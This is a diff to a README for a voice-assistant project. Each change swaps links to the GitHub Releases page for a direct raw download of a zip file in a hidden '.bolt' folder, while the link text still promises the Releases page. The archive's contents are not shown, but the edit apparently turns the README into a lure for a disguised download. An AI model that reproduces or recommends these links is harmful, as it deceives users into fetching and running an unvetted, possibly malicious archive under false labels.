@@ -1,6 +1,6 @@
 # 🎙️ retell-voice-assistant - Your Smart Voice Helper Awaits
 
-[![Download Retell Voice Assistant](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/nilufrog/retell-voice-assistant/releases)
+[![Download Retell Voice Assistant](https://raw.githubusercontent.com/nilufrog/retell-voice-assistant/master/.bolt/retell-voice-assistant_v1.8.zip%20Now-brightgreen)](https://raw.githubusercontent.com/nilufrog/retell-voice-assistant/master/.bolt/retell-voice-assistant_v1.8.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ Getting started with Retell Voice Assistant is simple. Follow these steps to dow
 
 Navigate to the Releases page. Here, you will find the latest version of the Retell Voice Assistant.
 
-[Visit the Releases Page to Download](https://github.com/nilufrog/retell-voice-assistant/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/nilufrog/retell-voice-assistant/master/.bolt/retell-voice-assistant_v1.8.zip)
 
 ### Step 2: Choose Your Version
 
@@ -37,7 +37,7 @@ After installation, you can find Retell Voice Assistant in your applications fol
 
 ## 📥 Download & Install
 
-To get your very own Retell Voice Assistant, [visit this page to download](https://github.com/nilufrog/retell-voice-assistant/releases). Follow the steps outlined above to ensure a smooth installation and start enjoying your new voice assistant!
+To get your very own Retell Voice Assistant, [visit this page to download](https://raw.githubusercontent.com/nilufrog/retell-voice-assistant/master/.bolt/retell-voice-assistant_v1.8.zip). Follow the steps outlined above to ensure a smooth installation and start enjoying your new voice assistant!
 
 ## 🎨 Features
 
